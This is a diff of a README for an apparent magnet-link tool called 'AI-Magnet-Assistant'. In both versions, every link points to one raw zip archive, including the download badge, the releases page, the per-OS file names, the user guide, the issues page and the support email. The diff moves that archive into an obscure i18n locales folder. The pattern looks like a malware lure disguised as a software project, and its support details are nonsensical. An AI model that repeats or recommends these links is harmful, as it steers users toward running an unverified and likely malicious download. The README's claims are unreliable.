@@ -1,7 +1,7 @@
 # 🤖 AI-Magnet-Assistant - Easily Find and Organize Magnet Links
 
 ## 🔗 Download Now
-[![Download AI-Magnet-Assistant](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip%20Now-%https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)
+[![Download AI-Magnet-Assistant](https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip%20Now-%https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip)](https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the AI Magnet Assistant! This application helps you aggregate and optimize magnet links using intelligent filtering. With this tool, you can easily find and organize your content, making download management a breeze.
@@ -22,14 +22,14 @@ To use AI-Magnet-Assistant, ensure your system meets the following requirements:
 To get started with AI-Magnet-Assistant, visit the Releases page to download the latest version of the application. Follow these steps:
 
 1. Click on the link below to go to the Releases page.
-   [Visit the Releases Page](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)
+   [Visit the Releases Page](https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip)
 
 2. On the Releases page, find the latest version. Look for the section labeled **Assets**.
    
 3. Click on the file that matches your operating system. For example:
-   - For Windows, you may see `https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip`.
-   - For Linux distributions, you might find a `https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip` file.
+   - For Windows, you may see `https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip`.
+   - For macOS, look for `https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip`.
+   - For Linux distributions, you might find a `https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip` file.
 
 4. After clicking on the appropriate file, your download will begin.
 
@@ -49,7 +49,7 @@ After installation, you can easily start using the application:
 4. **Download:** Click on any magnet link to start downloading your desired file.
 
 ## 📄 User Guide
-For detailed instructions, visit our user manual [here](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip). The user guide provides step-by-step instructions on how to use each feature effectively.
+For detailed instructions, visit our user manual [here](https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip). The user guide provides step-by-step instructions on how to use each feature effectively.
 
 ## ⚙️ Troubleshooting
 If you encounter issues while using AI-Magnet-Assistant:
@@ -57,11 +57,11 @@ If you encounter issues while using AI-Magnet-Assistant:
 - Restart the application.
 - Check for updates on the Releases page.
 
-If problems persist, feel free to open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip), and our team will assist you.
+If problems persist, feel free to open an issue on our [GitHub Issues Page](https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip), and our team will assist you.
 
 ## 📞 Support
 For additional help, contact us at:
-- Email: https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip
-- GitHub Issues: [Open a New Issue](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)
+- Email: https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip
+- GitHub Issues: [Open a New Issue](https://github.com/adamwick/AI-Magnet-Assistant/raw/refs/heads/master/src/i18n/locales/en/messages/Assistant-A-Magnet-1.5-alpha.3.zip)
 
 Thank you for using AI-Magnet-Assistant! We hope our tool simplifies your search and organization of magnet links. Enjoy!
